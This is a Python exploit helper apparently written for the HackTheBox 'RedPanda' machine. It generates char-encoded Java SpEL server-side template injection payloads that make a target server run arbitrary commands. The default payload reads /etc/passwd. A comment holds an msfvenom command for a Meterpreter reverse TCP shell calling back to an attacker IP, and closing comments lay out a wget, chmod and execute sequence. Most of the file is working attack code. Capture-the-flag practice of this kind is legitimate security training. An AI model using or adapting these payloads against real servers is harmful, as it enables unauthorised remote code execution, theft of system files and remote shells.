#!/usr/bin/env python3

# Create a java 'char' encoded string for use with SSTI and other Java based exploitation.
# Places the char encoded lines into the payload for Java here:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java
#
# HTB: RedPanda


import sys


IP = "10.10.14.19"
PORT = "8443"


message = input("Enter command/text to char encode (e.g. whoami): ")


default_message = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}"


print('Java formatted string for your exploit:\n')

# These pieces go before and after the char encoded string
payload_start = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("
payload_end = "().getInputStream())}"

payload = ''
payload += payload_start

print("${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(", end='')
for ch in message:
    print('.concat(T(java.lang.Character).toString({0}))'.format(ord(ch)), end='')
    payload_add = ".concat(T(java.lang.Character).toString({0}))".format(ord(ch))
    payload += payload_add
print("().getInputStream())}", end='')
print()

# Now we have the full payload string generated
payload += payload_end
print("Generated Payload String:")
print('-'*30)
print(payload)
print('-'*30)




def create_meterpreter():
    # msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
    pass
    return





# Exploit Sequence:
#   1. wget the file
#   2. chmod +x it
#   3. execute it

# It is normal for it to hang when you run it



